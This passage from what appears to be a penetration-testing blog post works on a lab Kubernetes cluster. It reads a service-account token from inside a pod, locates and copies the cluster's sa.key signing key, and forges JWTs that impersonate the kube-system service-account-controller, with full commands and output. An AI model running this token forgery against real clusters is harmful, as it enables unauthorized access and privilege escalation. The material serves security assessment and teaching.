nginx-app-5777b5f95-tfwt5   1/1     Running   0          3h55m
```

We will access the first pod in the list -`nginx-app-5777b5f95-97489`. First we will copy the `kubectl` command line tool into the pod so we can easily query the Kubernetes API from within the pod using the service account credentials.
```
(crypto) stephen@kubemaster:~/certs$ kubectl cp `which kubectl` nginx-app-5777b5f95-97489:/usr/bin/
```


Now let's open a bash shell in the pod.

```
(crypto) stephen@kubemaster:~/certs$ kubectl exec -it nginx-app-5777b5f95-97489 -- /bin/bash
root@nginx-app-5777b5f95-97489:/#
```

Let's list pods from the container. Note we can see pods in the `default` namespace (used if no namespace is explicly named), but we cannot see them in the `kube-system` namespace.

```
root@nginx-app-5777b5f95-97489:/# kubectl get pods
NAME                        READY   STATUS    RESTARTS   AGE
nginx-app-5777b5f95-97489   1/1     Running   0          3h58m
nginx-app-5777b5f95-tfwt5   1/1     Running   0          3h58m

root@nginx-app-5777b5f95-97489:/# kubectl get pods -n kube-system
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "kube-system"
```

Also note, there is no kubectl config file like we had on the host. 
```
root@nginx-app-5777b5f95-97489:/# ls ~/.kube/config
ls: cannot access '/root/.kube/config': No such file or directory
```

How then is `kubectl` finding the API server and authenticating?

There are actually a few ways that the Kubernetes API server can be located from within a container. 

The first is via DNS. Kubernetes will create a `kubernetes` service in the `default` namespace to allow the API server to be easily discovered. This will have an `A` record giving the internal cluster address of the API server at address `kubernetes.default.svc.cluster.local`, and a `SRV` record giving the internal port of the service (usually 443) at address `_https._tcp.kubernetes.default.svc.cluster.local`.

The second is via environment variables with `KUBERNETES` in the name, as shown below:
```
root@nginx-app-5777b5f95-97489:/# env | grep KUBERNETES
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
```

The credentials are provided to the container via a tmpfs mount configured automatically by Kubernetes when it runs the pod. You can see this using the mount command. The default path is `/run/secrets/kubernetes.io/serviceaccount`

```
root@nginx-app-5777b5f95-97489:/# mount | grep serviceaccount
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=3902996k,inode64)
```

This folder contains 3 files, as shown below (I have added some spacing between commands in the output below to make things a little more readable).

```
root@nginx-app-5777b5f95-97489:/# ls /run/secrets/kubernetes.io/serviceaccount/
ca.crt	namespace  token

root@nginx-app-5777b5f95-97489:/# cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIDBTCCAe2gAwIBAgIIBy6KdfKkQ3gwDQYJKoZIhvcNAQELBQAwFTETMBEGA1UE
AxMKa3ViZXJuZXRlczAeFw0yMzExMDgwMTIwNDZaFw0zMzExMDUwMTI1NDZaMBUx
EzARBgNVBAMTCmt1YmVybmV0ZXMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQC+lUi8cHdUbcbHUbFY2fCWxQ4+On9jV4isqXeuysD+hvT4PaY9TM/OzOwP
OA1YmyhSTrADlS+jjqfx/O73cE15Sw5JoW3JyTmmo8sp1E8ODB0U7YtOVirRBMen
lkJSKP9BMTMNaInEbH/8zP5I/Y5lcIVGy6b1BYsG/+/Bwj4bAPgm7ZQfkhkyqY2j
jxcUh0/H5bUFXeFdyFhhqxIvHaDsKG5bhVHREmuLSJsoTG8ygD/i3nhtkxF0KHxj
A1+QKdDjaTYajnacnZ2jG+AFENMC2NYw3rAMX/P54Np6P9JkukCS+XK2lCvb3PIq
SadMIj+lITTjezbgcw2cv2A+6B5DAgMBAAGjWTBXMA4GA1UdDwEB/wQEAwICpDAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTgYbD4N8i7PgpS7OKuEb5xlEHEnDAV
BgNVHREEDjAMggprdWJlcm5ldGVzMA0GCSqGSIb3DQEBCwUAA4IBAQAUjRiaXfQN
aE45Vcw52/bXev/7ZZq7Nd/k8CFygKNr2rmiNQcIkI71qvILDxFhOsNUhaITGQNZ
dYOfg7D976agn1HtcAAm9IIEAihnu9SLXW4sQvXpWXG+zSNzd21JDKD/Yyr2nCTM
+6jMSQbl9gGOjXCuES4f7jyjEtUDHyttiCxRDUnzSoporlG8j/xzhP8iZHCzRVGP
in9a/iEx9ReCNrnsKSH7JuAfX0YzLAAJx5JWA4j3qoI2bPgAv/naUOiJckYZTuks
wdBrTDRT8krq8JgcBLBDkV6nUD45+llHAB8GunHXdtIXw4tKtBuLgxk44KUQJdov
xwf5rtvfVj66
-----END CERTIFICATE-----

root@nginx-app-5777b5f95-97489:/# cat /run/secrets/kubernetes.io/serviceaccount/namespace
default

root@nginx-app-5777b5f95-97489:/# cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IlNNVFRFSHNnOVoxcVNZZzd6d3hnZTZPcDczWHVFZHYxY19BcFEwQVh6REkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMxNTY0OTY2LCJpYXQiOjE3MDAwMjg5NjYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueC1hcHAtNTc3N2I1Zjk1LTk3NDg5IiwidWlkIjoiNTJhNzEwNWEtZmNmZi00OWMyLTk3NTktMTgxNWJkMDc4ZmQ3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiZGZhMTNjZWItNTE2MC00YTFhLTk4MDMtMDQ5ZTQ4NzNhNjA5In0sIndhcm5hZnRlciI6MTcwMDAzMjU3M30sIm5iZiI6MTcwMDAyODk2Niwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.uk7ccvYio_a8lwLk_PAPlxf7HHRuVqvuStTNIzKfwRI4NASgs6Ywn8dBpgYSoyhnYbSKJ6rVb0WsvbfFJMUE4uUUv8RqeaJFiNvRjx2JIkLL6BDp_HAaLGAg257pPj-PrHjCAL2ANEy604rIotAietyEytEBgmRjgA2IRVRsQdSCPaq_PPbBmpPrBo0Uv9wEpFObPpp_31cmzVgYJSvyrAEkHK33EY5wgNLmv2WF-IbEkj57AgBC_D3uGCOZWmjXCaNyhlWOSgVb8nGCnC63QzP1BnMvBkF6W6XnoxG04KWUzTAQxmORnXqtxUPgAEvGsXBFKVt9mKnGD4aWmJBNPA
```

The `ca.crt` is the same Kubernetes Certificate Authority that identifies the API servers TLS certificate, as we saw in the last section. 

The `namespace` file identifies the namespace that the container is running in. 

The `token` file is the authentication credentials for the service account, in the form of a JWT.

We can decode the header and claims section of the JWT to get some more insight into how it works. This basically involves splitting the token on the period (".") character and URL safe base64 decoding the first and second sections of the token, padding with "=" where necessary. 

The first part of the token is the header, which usually identifies the algorithm used to sign the JWT and other values that might be used by recipients to parse the token correctly. 

The second part contains claim data, the primary content of the JWT, and is usually used to identify a user. 

The third part of the JWT contains the signature that verifies the authenticity of the claim and header data and is not useful to us until we want to identify keys and create our own tokens.

```
root@nginx-app-5777b5f95-97489:/# cat /run/secrets/kubernetes.io/serviceaccount/token | echo "$(cut -d '.' -f 1)==" | base64 -d
{"alg":"RS256","kid":"SMTTEHsg9Z1qSYg7zwxge6Op73XuEdv1c_ApQ0AXzDI"}
root@nginx-app-5777b5f95-97489:/# cat /run/secrets/kubernetes.io/serviceaccount/token | echo "$(cut -d '.' -f 2)==" | base64 -d
{"aud":["https://kubernetes.default.svc.cluster.local"],"exp":1731564966,"iat":1700028966,"iss":"https://kubernetes.default.svc.cluster.local","kubernetes.io":{"namespace":"default","pod":{"name":"nginx-app-5777b5f95-97489","uid":"52a7105a-fcff-49c2-9759-1815bd078fd7"},"serviceaccount":{"name":"default","uid":"dfa13ceb-5160-4a1a-9803-049e4873a609"},"warnafter":1700032573},"nbf":1700028966,"sub":"system:serviceaccount:default:default"}
```

This gives us a lot of information, the most useful of which is:
* The JWT signing algorithm used, `RS256`, which involves signing the JWT with a 2048 bit RSA key (the private key is used to sign and the public key to verify).
* The keyid (kid) of the public key used for verification of the JWT `SMTTEHsg9Z1qSYg7zwxge6Op73XuEdv1c_ApQ0AXzDI`. This is generated algorithmicly from the public key's contents and we have the option to use this to confirm we have the correct key to create our own tokens when we find it.
* Various details of the service account associated with the token, including it's name `default`, it's namespace `default` and it's uid `dfa13ceb-5160-4a1a-9803-049e4873a609`. If we didn't already know the name of the service account being used, we could work it out from here.
* A template of the claim data that is required for a token to be accepted as valid by Kubernetes. Authentication systems using JWTs usually expect specific claim data to be considered valid, and this gives us a working example of what claims might be required.

Similar to what we did for client certificates, we can also use curl to authenticate to the Kubernetes API with the JWT, which will allow us to more easily test our own tokens once we create them.

We do this by using the `Authorization` header to send the token in our HTTP requests to the API server as a `Bearer` token. This header would look like the following:

```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IlNNVFRFSHNnOVoxcVNZZzd6d3hnZTZPcDczWHVFZHYxY19BcFEwQVh6REkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMxNTY0OTY2LCJpYXQiOjE3MDAwMjg5NjYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueC1hcHAtNTc3N2I1Zjk1LTk3NDg5IiwidWlkIjoiNTJhNzEwNWEtZmNmZi00OWMyLTk3NTktMTgxNWJkMDc4ZmQ3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiZGZhMTNjZWItNTE2MC00YTFhLTk4MDMtMDQ5ZTQ4NzNhNjA5In0sIndhcm5hZnRlciI6MTcwMDAzMjU3M30sIm5iZiI6MTcwMDAyODk2Niwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.uk7ccvYio_a8lwLk_PAPlxf7HHRuVqvuStTNIzKfwRI4NASgs6Ywn8dBpgYSoyhnYbSKJ6rVb0WsvbfFJMUE4uUUv8RqeaJFiNvRjx2JIkLL6BDp_HAaLGAg257pPj-PrHjCAL2ANEy604rIotAietyEytEBgmRjgA2IRVRsQdSCPaq_PPbBmpPrBo0Uv9wEpFObPpp_31cmzVgYJSvyrAEkHK33EY5wgNLmv2WF-IbEkj57AgBC_D3uGCOZWmjXCaNyhlWOSgVb8nGCnC63QzP1BnMvBkF6W6XnoxG04KWUzTAQxmORnXqtxUPgAEvGsXBFKVt9mKnGD4aWmJBNPA
```

Heres how thats done in curl, reading the CA cert and token from their files on disk.

```
root@nginx-app-5777b5f95-97489:/# curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc.cluster.local/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.10.123:6443"
    }
  ]
}

```

## Identifying the JWT key

Let's exit out of the container and work on the host again. The first thing we will do is install a command line tool that supports verification of JWTs that we can use to identify the key that was used for signing.


```
root@nginx-app-5777b5f95-97489:/# exit
exit
(crypto) stephen@kubemaster:~/certs$ sudo apt install jwt
[....SNIP....]
```

With that installed we are ready to start testing keys.

The `RS256` algorithm signs keys using the RSA private key and verifies them using the public key. To find the keypair that is being used in this Kubernetes system for creating JWTs such as our reference token shown above, we can take an existing token and try and verify it using a candidate public key. If it passes verification, its the right key. 

As mentioned above, it is also possible in the case of Kubernetes to identify the key being used to sign a JWT by algorithmically generating the key ID from a candidate public key and comparing it to the `kid` value in the JWT header.  However, given that I also wanted this post to be used as an example guide for assessing cryptosystems, this approach will not be universally applicable as algorithmically generated key IDs are not used in all systems, so the more straightforward method of attempting to verify the JWT using candidate public keys is probably preferable.

Since we already have the CA key for the Kubernetes system retrieved from our last section we can try that for verification to see ifs the correct key. (Spoiler alert, this is NOT the correct key, but let's go through the process anyway).

Let's write the token to file on our host, extract the public key from the ca private key to it's own file and try and use it to verify our token.

```
(crypto) stephen@kubemaster:~/certs$ echo 'eyJhbGciOiJSUzI1NiIsImtpZCI6IlNNVFRFSHNnOVoxcVNZZzd6d3hnZTZPcDczWHVFZHYxY19BcFEwQVh6REkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMxNTY0OTY2LCJpYXQiOjE3MDAwMjg5NjYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueC1hcHAtNTc3N2I1Zjk1LTk3NDg5IiwidWlkIjoiNTJhNzEwNWEtZmNmZi00OWMyLTk3NTktMTgxNWJkMDc4ZmQ3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiZGZhMTNjZWItNTE2MC00YTFhLTk4MDMtMDQ5ZTQ4NzNhNjA5In0sIndhcm5hZnRlciI6MTcwMDAzMjU3M30sIm5iZiI6MTcwMDAyODk2Niwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.uk7ccvYio_a8lwLk_PAPlxf7HHRuVqvuStTNIzKfwRI4NASgs6Ywn8dBpgYSoyhnYbSKJ6rVb0WsvbfFJMUE4uUUv8RqeaJFiNvRjx2JIkLL6BDp_HAaLGAg257pPj-PrHjCAL2ANEy604rIotAietyEytEBgmRjgA2IRVRsQdSCPaq_PPbBmpPrBo0Uv9wEpFObPpp_31cmzVgYJSvyrAEkHK33EY5wgNLmv2WF-IbEkj57AgBC_D3uGCOZWmjXCaNyhlWOSgVb8nGCnC63QzP1BnMvBkF6W6XnoxG04KWUzTAQxmORnXqtxUPgAEvGsXBFKVt9mKnGD4aWmJBNPA' > token
(crypto) stephen@kubemaster:~/certs$ openssl rsa -in ca.key -pubout -out ca.pub
writing RSA key
(crypto) stephen@kubemaster:~/certs$ jwt -alg RS256 -key ca.pub -verify token
Error: couldn't parse token: crypto/rsa: verification error
```

OK, no good. As it turns out, there is a dedicated keypair for signing service account tokens in Kubernetes. In our sample Kubernetes system there are two pods that reference it - the API server and the controller manager.


Let's grab the names of the appropriate pods (they will be different depending on your Kubernetes servers hostname).

```
(crypto) stephen@kubemaster:~/certs$ kubectl get pods -n kube-system
NAME                                              READY   STATUS    RESTARTS   AGE
calico-kube-controllers-658d97c59c-88r9c          1/1     Running   0          7d5h
calico-node-fwptx                                 1/1     Running   0          7d5h
coredns-5dd5756b68-snhk5                          1/1     Running   0          7d5h
coredns-5dd5756b68-vlb88                          1/1     Running   0          7d5h
etcd-kubemaster.thezoo.local                      1/1     Running   0          7d5h
kube-apiserver-kubemaster.thezoo.local            1/1     Running   0          7d5h
kube-controller-manager-kubemaster.thezoo.local   1/1     Running   0          7d5h
kube-proxy-w2xfd                                  1/1     Running   0          7d5h
kube-scheduler-kubemaster.thezoo.local            1/1     Running   0          7d5h
```


Now, given the names of the pods, we can find the location from where the key is referenced by looking at the `service-account-private-key-file` (kube-controller-manager pod) or `service-account-signing-key-file` (kube-apiserver pod) parameters.
```
(crypto) stephen@kubemaster:~/certs$ kubectl describe pods -n kube-system kube-controller-manager-kubemaster.thezoo.local | grep 'service-account'
      --service-account-private-key-file=/etc/kubernetes/pki/sa.key
      --use-service-account-credentials=true
(crypto) stephen@kubemaster:~/certs$ kubectl describe pods -n kube-system kube-apiserver-kubemaster.thezoo.local | grep 'service-account'
      --service-account-issuer=https://kubernetes.default.svc.cluster.local
      --service-account-key-file=/etc/kubernetes/pki/sa.pub
      --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
```


The file we are after is `/etc/kubernetes/pki/sa.key`. Let's grab it, change ownership, extract the public key to it's own file and retry verification.


```
(crypto) stephen@kubemaster:~/certs$ sudo cp  /etc/kubernetes/pki/sa.key .
(crypto) stephen@kubemaster:~/certs$ sudo chown stephen:stephen sa.key
(crypto) stephen@kubemaster:~/certs$ openssl rsa -in sa.key -pubout -out sa.pub
writing RSA key
(crypto) stephen@kubemaster:~/certs$ jwt -alg RS256 -key sa.pub -verify token
{
    "aud": [
        "https://kubernetes.default.svc.cluster.local"
    ],
    "exp": 1731564966,
    "iat": 1700028966,
    "iss": "https://kubernetes.default.svc.cluster.local",
    "kubernetes.io": {
        "namespace": "default",
        "pod": {
            "name": "nginx-app-5777b5f95-97489",
            "uid": "52a7105a-fcff-49c2-9759-1815bd078fd7"
        },
        "serviceaccount": {
            "name": "default",
            "uid": "dfa13ceb-5160-4a1a-9803-049e4873a609"
        },
        "warnafter": 1700032573
    },
    "nbf": 1700028966,
    "sub": "system:serviceaccount:default:default"
}

```

OK, this output of the claims data from the JWT means we have found the correct key. 


## Creating our own tokens

Let's write the claims data from the previous output to a file so we have something to work with. 

```
(crypto) stephen@kubemaster:~/certs$ jwt -alg RS256 -key sa.pub -verify token > claims
(crypto) stephen@kubemaster:~/certs$ cat claims
{
    "aud": [
        "https://kubernetes.default.svc.cluster.local"
    ],
    "exp": 1731564966,
    "iat": 1700028966,
    "iss": "https://kubernetes.default.svc.cluster.local",
    "kubernetes.io": {
        "namespace": "default",
        "pod": {
            "name": "nginx-app-5777b5f95-97489",
            "uid": "52a7105a-fcff-49c2-9759-1815bd078fd7"
        },
        "serviceaccount": {
            "name": "default",
            "uid": "dfa13ceb-5160-4a1a-9803-049e4873a609"
        },
        "warnafter": 1700032573
    },
    "nbf": 1700028966,
    "sub": "system:serviceaccount:default:default"
}
```

Now let's try and create our own token using these claims and test it using curl to confim we have a working signing process.

```
(crypto) stephen@kubemaster:~/certs$ jwt -alg RS256 -header 'kid=SMTTEHsg9Z1qSYg7zwxge6Op73XuEdv1c_ApQ0AXzDI' -key sa.key -sign claims >forged_token
(crypto) stephen@kubemaster:~/certs$ curl --cacert ca.crt -H "Authorization: Bearer $(cat forged_token)" https://kubemaster.thezoo.local:6443/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.10.123:6443"
    }
  ]
}
```

Success! This at proves we have a working key and our method of generating tokens is compatible. However, all we have done so far is just recreate the existing token we already had, filling in details by just copying details verbatim. What if we want to forge arbitrary tokens??

First, how can we derive the kid to use from the public key. (This is not necessary in this case as only one key is in use in the system and we can just exclude the `kid` field from the JWT header and still have it work, but we can do it for completeness and to provide another way to identify keys).

This value is actually the sha256 hash of the DER format of the public key, URL-safe base64 encoded. Here it is using the command line
```
(crypto) stephen@kubemaster:~/certs$ openssl rsa -pubin -outform der -in sa.pub 2>/dev/null | openssl sha256 -binary | basenc --base64url | sed --expression 's/=//g'
SMTTEHsg9Z1qSYg7zwxge6Op73XuEdv1c_ApQ0AXzDI
```

Let's play with the claims data to get it down to a more minimal form so we are not wasting our time reproducing extra data we dont need. By trial and error this is the minimised version of whats needed in the claims section of the JWT that I came up with.

```
(crypto) stephen@kubemaster:~/certs$ cat claimsmod
{
    "aud": [
        "https://kubernetes.default.svc.cluster.local"
    ],
    "exp": 1731564966,
    "iat": 1700028966,
    "iss": "https://kubernetes.default.svc.cluster.local",
    "kubernetes.io": {
        "namespace": "default",
        "serviceaccount": {
            "name": "default",
            "uid": "dfa13ceb-5160-4a1a-9803-049e4873a609"
        }
    },
    "nbf": 1700028966,
    "sub": "system:serviceaccount:default:default"
}
(crypto) stephen@kubemaster:~/certs$ jwt -alg RS256 -header 'kid=SMTTEHsg9Z1qSYg7zwxge6Op73XuEdv1c_ApQ0AXzDI' -key sa.key -sign claimsmod >forged_token2
(crypto) stephen@kubemaster:~/certs$ curl --cacert ca.crt -H "Authorization: Bearer $(cat forged_token2)" https://kubemaster.thezoo.local:6443/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.10.123:6443"
    }
  ]
}
```

The `exp` (expiry), `iat` (issued at) and `nbf` (not before) in the sample above are all epoch timestamps and represent the time period within which the generated token will be valid.  I didnt need to change these for this example but once the current time is past the `exp` value you will need to update these for the tokens to be valid. Once this is required you can generate a timestamp for the current time like so for `iat` and `nbf` and then add a big number to it (in this example its 31536000) for `exp`.

```
stephen@kubemaster:~$ date +%s
1700045771
```



Now that our claims data is minimised what if we want to create a token for a different service account? Here are the accounts in the system:

```
(crypto) stephen@kubemaster:~/certs$ kubectl get sa --all-namespaces
NAMESPACE         NAME                                 SECRETS   AGE
default           default                              0         7d7h
kube-node-lease   default                              0         7d7h
kube-public       default                              0         7d7h
kube-system       attachdetach-controller              0         7d7h
kube-system       bootstrap-signer                     0         7d7h
kube-system       calico-kube-controllers              0         7d7h
kube-system       calico-node                          0         7d7h
kube-system       certificate-controller               0         7d7h
kube-system       clusterrole-aggregation-controller   0         7d7h
kube-system       coredns                              0         7d7h
kube-system       cronjob-controller                   0         7d7h
kube-system       daemon-set-controller                0         7d7h
kube-system       default                              0         7d7h
kube-system       deployment-controller                0         7d7h
kube-system       disruption-controller                0         7d7h
kube-system       endpoint-controller                  0         7d7h
kube-system       endpointslice-controller             0         7d7h
kube-system       endpointslicemirroring-controller    0         7d7h
kube-system       ephemeral-volume-controller          0         7d7h
kube-system       expand-controller                    0         7d7h
kube-system       generic-garbage-collector            0         7d7h
kube-system       horizontal-pod-autoscaler            0         7d7h
kube-system       job-controller                       0         7d7h
kube-system       kube-proxy                           0         7d7h
kube-system       namespace-controller                 0         7d7h
kube-system       node-controller                      0         7d7h
kube-system       persistent-volume-binder             0         7d7h
kube-system       pod-garbage-collector                0         7d7h
kube-system       pv-protection-controller             0         7d7h
kube-system       pvc-protection-controller            0         7d7h
kube-system       replicaset-controller                0         7d7h
kube-system       replication-controller               0         7d7h
kube-system       resourcequota-controller             0         7d7h
kube-system       root-ca-cert-publisher               0         7d7h
kube-system       service-account-controller           0         7d7h
kube-system       service-controller                   0         7d7h
kube-system       statefulset-controller               0         7d7h
kube-system       token-cleaner                        0         7d7h
kube-system       ttl-after-finished-controller        0         7d7h
kube-system       ttl-controller                       0         7d7h
```


Let's try and impersonate the `service-account-controller` account. To successfully modify the basic claims template to work for this account we need to know the account name (`service-account-controller`) the namespace (`kube-system` from the output above) and the uid.

The uid is the only value we dont have, but we can get this from the API in a number of ways, including the following: 

```
(crypto) stephen@kubemaster:~/certs$ kubectl get sa service-account-controller -n kube-system -o jsonpath='{.metadata.uid}'
2eb4a3d0-9756-4d13-ab07-69a062998a26
```

The new claims data with the previously mentioned values inserted looks like the following:

```
(crypto) stephen@kubemaster:~/certs$ cat claimssc
{
    "aud": [
        "https://kubernetes.default.svc.cluster.local"
    ],
    "exp": 1731564966,
    "iat": 1700028966,
    "iss": "https://kubernetes.default.svc.cluster.local",
    "kubernetes.io": {
        "namespace": "kube-system",
        "serviceaccount": {
            "name": "service-account-controller",
            "uid": "2eb4a3d0-9756-4d13-ab07-69a062998a26"
        }
    },
    "nbf": 1700028966,
    "sub": "system:serviceaccount:kube-system:service-account-controller"
}
```


Now let's create a new token and test it against the API:

```
(crypto) stephen@kubemaster:~/certs$ jwt -alg RS256 -header 'kid=SMTTEHsg9Z1qSYg7zwxge6Op73XuEdv1c_ApQ0AXzDI' -key sa.key -sign claimssc >forged_token3
(crypto) stephen@kubemaster:~/certs$ curl --cacert ca.crt -H "Authorization: Bearer $(cat forged_token3)" https://kubemaster.thezoo.local:6443/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.10.123:6443"
    }
  ]
}
```

Success!

Also, if you'd prefer the [Python helper code](https://raw.githubusercontent.com/stephenbradshaw/pentesting_stuff/master/example_code/crypto_helpers.py) referenced in the previous section on user certificates also includes functions to help performing the JWT analysis and creation that we just did from the command line.


